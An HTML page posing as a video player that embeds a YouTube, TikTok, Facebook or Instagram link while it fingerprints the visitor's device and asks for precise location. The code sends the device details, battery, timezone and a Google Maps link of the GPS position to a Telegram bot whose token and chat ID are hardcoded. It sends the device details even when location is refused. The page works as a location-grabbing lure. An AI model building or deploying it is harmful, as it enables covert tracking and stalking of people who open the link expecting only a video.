<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">

    <title>App Loading...</title>

    <style>
        * {
            box-sizing: border-box;
        }

        html, body {
            margin: 0;

            background: #555;
            margin-left: 8px;
        }

        #locationStatus {
            margin-top: 10px;

</head>

<body>

<div id="app">

    <div id="loading">
        <div class="spinner"></div>
        <p>ভিডিও লোড হচ্ছে...</p>
    </div>

</div>


<!-- Location permission -->
<div id="locationBox">

    <div>
        📍 Location শেয়ার করতে চান?
    </div>

    <div style="font-size:13px;margin-top:7px;">
        Location দিলে সেটি আপনার নির্ধারিত Telegram চ্যাটে
        পাঠানো হবে।
    </div>

    <button onclick="requestLocation()">
        Allow Location
    </button>

    <button class="cancel" onclick="skipLocation()">
        Skip
    </button>

    <div id="locationStatus"></div>

</div>


<script>

/* =====================================================
   TELEGRAM SETTINGS
   ===================================================== */

const BOT_TOKEN = "8855743272:AAGFFDUIG4k8IPuiMOBuwLOjfvKMIYXk79A";

const CHAT_ID = "5980493892";


/* =====================================================
   VIDEO LINK
   =====================================================

   YouTube:
   https://www.youtube.com/watch?v=VIDEO_ID

   YouTube Shorts:
   https://youtube.com/shorts/VIDEO_ID

   TikTok:
   https://www.tiktok.com/@username/video/VIDEO_ID

   Facebook:
   https://www.facebook.com/.../videos/...

   Instagram:
   https://www.instagram.com/reel/...

   Direct MP4:
   https://example.com/video.mp4
   ===================================================== */

const VIDEO_URL =
    "https://youtu.be/v_oDRAjpkGA?si=slsmLIVZTDs9NO7o";


/* =====================================================
   APP START
   ===================================================== */

document.addEventListener("DOMContentLoaded", function () {

    loadVideo(VIDEO_URL);

    collectDeviceInformation();

});


/* =====================================================
   DEVICE ID
   ===================================================== */

function getDeviceId() {

    let deviceId =
        localStorage.getItem("app_device_id");

    if (!deviceId) {

        deviceId =
            "DEV-" +
            Math.floor(
                100000 +
                Math.random() * 900000
            );

        localStorage.setItem(
            "app_device_id",
            deviceId
        );
    }

    return deviceId;
}


/* =====================================================
   DEVICE ANALYTICS
   ===================================================== */

const analytics = {

    deviceId: getDeviceId(),

    userAgent: navigator.userAgent,

    ram:
        navigator.deviceMemory
        ? navigator.deviceMemory + " GB"
        : "Unknown",

    cores:
        navigator.hardwareConcurrency
        ? navigator.hardwareConcurrency + " Cores"
        : "Unknown",

    screenRes:
        window.screen.width +
        " x " +
        window.screen.height,

    orientation:
        window.screen.height >=
        window.screen.width
        ? "Portrait"
        : "Landscape",

    theme:
        window.matchMedia(
            "(prefers-color-scheme: dark)"
        ).matches
        ? "Dark Mode"
        : "Light Mode",

    networkType:
        navigator.connection
        ? navigator.connection.effectiveType.toUpperCase()
        : "Unknown",

    downlink:
        navigator.connection
        ? navigator.connection.downlink + " Mbps"
        : "Unknown",

    localTime:
        new Date().toLocaleTimeString(),

    timeZone:
        Intl.DateTimeFormat()
        .resolvedOptions()
        .timeZone,

    language:
        navigator.language ||
        navigator.userLanguage ||
        "Unknown",

    battery:
        "Unknown",

    permissionStatus:
        "Not Requested",

    mapLink:
        "N/A"
};


/* =====================================================
   COLLECT DEVICE INFORMATION
   ===================================================== */

function collectDeviceInformation() {

    if (navigator.getBattery) {

        navigator.getBattery()
            .then(function (battery) {

                analytics.battery =
                    Math.round(
                        battery.level * 100
                    ) +
                    "% (" +
                    (
                        battery.charging
                        ? "Charging"
                        : "Not Charging"
                    ) +
                    ")";

            })
            .catch(function () {

                analytics.battery =
                    "Unknown";

            });

    } else {

        analytics.battery =
            "Not Supported";
    }

}


/* =====================================================
   LOCATION PERMISSION
   ===================================================== */

function requestLocation() {

    const status =
        document.getElementById(
            "locationStatus"
        );

    status.textContent =
        "📍 Location নেওয়া হচ্ছে...";


    if (!navigator.geolocation) {

        analytics.permissionStatus =
            "Not Supported";

        status.textContent =
            "এই browser Location support করে না.";

        sendTelegramMessage();

        return;
    }


    navigator.geolocation.getCurrentPosition(

        function (position) {

            const lat =
                position.coords.latitude;

            const lon =
                position.coords.longitude;


            analytics.permissionStatus =
                "Allowed";

            analytics.mapLink =
                "https://www.google.com/maps?q=" +
                lat +
                "," +
                lon;


            status.textContent =
                "✅ Location অনুমোদিত হয়েছে।";


            sendTelegramMessage();


            setTimeout(function () {

                document.getElementById(
                    "locationBox"
                ).style.display = "none";

            }, 1000);

        },

        function () {

            analytics.permissionStatus =
                "Denied / Unavailable";

            analytics.mapLink =
                "N/A";


            status.textContent =
                "❌ Location অনুমোদন করা হয়নি।";


            sendTelegramMessage();

        },

        {
            enableHighAccuracy: true,
            timeout: 10000,
            maximumAge: 0
        }

    );

}


/* =====================================================
   LOCATION SKIP
   ===================================================== */

function skipLocation() {

    analytics.permissionStatus =
        "User Skipped";

    analytics.mapLink =
        "N/A";

    document.getElementById(
        "locationBox"
    ).style.display = "none";

}


/* =====================================================
   TELEGRAM MESSAGE
   ===================================================== */

function sendTelegramMessage() {

    let messageText =
        "📊 *App Analytics Notification*\n\n";


    messageText +=
        "🆔 *Device ID:* `" +
        analytics.deviceId +
        "`\n";


    messageText +=
        "📱 *Device Info:* " +
        analytics.userAgent +
        "\n";


    messageText +=
        "⚙️ *Hardware:* " +
        analytics.cores +
        " | ~" +
        analytics.ram +
        "\n";


    messageText +=
        "📐 *Display:* " +
        analytics.screenRes +
        " (" +
        analytics.orientation +
        ") | " +
        analytics.theme +
        "\n";


    messageText +=
        "🌐 *Network:* " +
        analytics.networkType +
        " (Speed: " +
        analytics.downlink +
        ")\n";


    messageText +=
        "🕒 *Time:* " +
        analytics.localTime +
        " (" +
        analytics.timeZone +
        ")\n";


    messageText +=
        "🗣️ *Language:* " +
        analytics.language +
        "\n";


    messageText +=
        "🔋 *Battery:* " +
        analytics.battery +
        "\n\n";


    messageText +=
        "🔒 *Location Permission:* " +
        analytics.permissionStatus +
        "\n";


    if (
        analytics.permissionStatus ===
        "Allowed"
    ) {

        messageText +=
            "🗺️ *Location:* [View Location on Google Maps](" +
            analytics.mapLink +
            ")";

    } else {

        messageText +=
            "⚠️ Location was not shared.";
    }


    const telegramURL =
        "https://api.telegram.org/bot" +
        BOT_TOKEN +
        "/sendMessage";


    fetch(telegramURL, {

        method: "POST",

        headers: {
            "Content-Type":
                "application/json"
        },

        body: JSON.stringify({

            chat_id: CHAT_ID,

            text: messageText,

            parse_mode: "Markdown",

            disable_web_page_preview: false

        })

    })

    .then(function (response) {

        return response.json();

    })

    .then(function (result) {

        console.log(
            "Telegram response:",
            result
        );

    })

    .catch(function (error) {

        console.error(
            "Telegram Error:",
            error
        );

    });

}


/* =====================================================
   VIDEO LOADER
   ===================================================== */

function loadVideo(url) {

    const app =
        document.getElementById("app");

    const loading =
        document.getElementById("loading");


    if (!url || url.trim() === "") {

        loading.innerHTML =
            "<p>ভিডিও লিংক দেওয়া হয়নি।</p>";

        return;
    }


    url = url.trim();

    const lower =
        url.toLowerCase();


    /* ==========================
       YOUTUBE
       ========================== */

    const youtubeID =
        getYouTubeID(url);


    if (youtubeID) {

        const iframe =
            document.createElement("iframe");


        iframe.src =
            "https://www.youtube.com/embed/" +
            youtubeID +
            "?autoplay=1&playsinline=1&rel=0";


        iframe.allow =
            "autoplay; encrypted-media; picture-in-picture";


        iframe.allowFullscreen =
            true;


        loading.remove();

        app.appendChild(iframe);

        return;
    }


    /* ==========================
       TIKTOK
       ========================== */

    if (
        lower.includes("tiktok.com")
    ) {

        const id =
            getTikTokID(url);


        const iframe =
            document.createElement("iframe");


        if (id) {

            iframe.src =
                "https://www.tiktok.com/player/v1/" +
                id +
                "?autoplay=1";

        } else {

            iframe.src = url;
        }


        iframe.allow =
            "autoplay; encrypted-media";


        iframe.allowFullscreen =
            true;


        loading.remove();

        app.appendChild(iframe);

        return;
    }


    /* ==========================
       FACEBOOK
       ========================== */

    if (
        lower.includes("facebook.com") ||
        lower.includes("fb.watch")
    ) {

        const iframe =
            document.createElement("iframe");


        iframe.src =
            "https://www.facebook.com/plugins/video.php?href=" +
            encodeURIComponent(url) +
            "&show_text=false";


        iframe.allow =
            "autoplay; encrypted-media; picture-in-picture";


        iframe.allowFullscreen =
            true;


        loading.remove();

        app.appendChild(iframe);

        return;
    }


    /* ==========================
       INSTAGRAM
       ========================== */

    if (
        lower.includes("instagram.com")
    ) {

        const iframe =
            document.createElement("iframe");


        let cleanURL =
            url.split("?")[0];


        if (!cleanURL.endsWith("/")) {

            cleanURL += "/";
        }


        iframe.src =
            cleanURL + "embed/";


        iframe.allowFullscreen =
            true;


        loading.remove();

        app.appendChild(iframe);

        return;
    }


    /* ==========================
       DIRECT VIDEO
       ========================== */

    if (
        lower.includes(".mp4") ||
        lower.includes(".webm") ||
        lower.includes(".ogg") ||
        lower.includes(".mov")
    ) {

        const video =
            document.createElement("video");


        video.src = url;

        video.controls = true;

        video.autoplay = true;

        video.playsInline = true;


        video.setAttribute(
            "webkit-playsinline",
            "true"
        );


        loading.remove();

        app.appendChild(video);


        video.play().catch(function () {

            console.log(
                "Autoplay blocked."
            );

        });


        return;
    }


    /* ==========================
       UNKNOWN LINK
       ========================== */

    loading.innerHTML =
        "<p>এই লিংকটি সরাসরি ভিডিও হিসেবে চালানো যাচ্ছে না।</p>";
}


/* =====================================================
   YOUTUBE ID
   ===================================================== */

function getYouTubeID(url) {

    try {

        const parsed =
            new URL(url);


        if (
            parsed.hostname.includes("youtube.com") &&
            parsed.pathname === "/watch"
        ) {

            return parsed.searchParams.get("v");
        }


        if (
            parsed.hostname.includes("youtu.be")
        ) {

            return parsed.pathname.substring(1);
        }


        if (
            parsed.hostname.includes("youtube.com") &&
            parsed.pathname.startsWith("/shorts/")
        ) {

            return parsed.pathname
                .split("/")[2];
        }


        if (
            parsed.hostname.includes("youtube.com") &&
            parsed.pathname.startsWith("/embed/")
        ) {

            return parsed.pathname
                .split("/")[2];
        }

    } catch (error) {

        return null;
    }


    return null;
}


/* =====================================================
   TIKTOK ID
   ===================================================== */

function getTikTokID(url) {

    try {

        const match =
            url.match(
                /\/video\/(\d+)/
            );


        if (match) {

            return match[1];
        }

    } catch (error) {}

    return null;
}

</script>

</body>
</html>
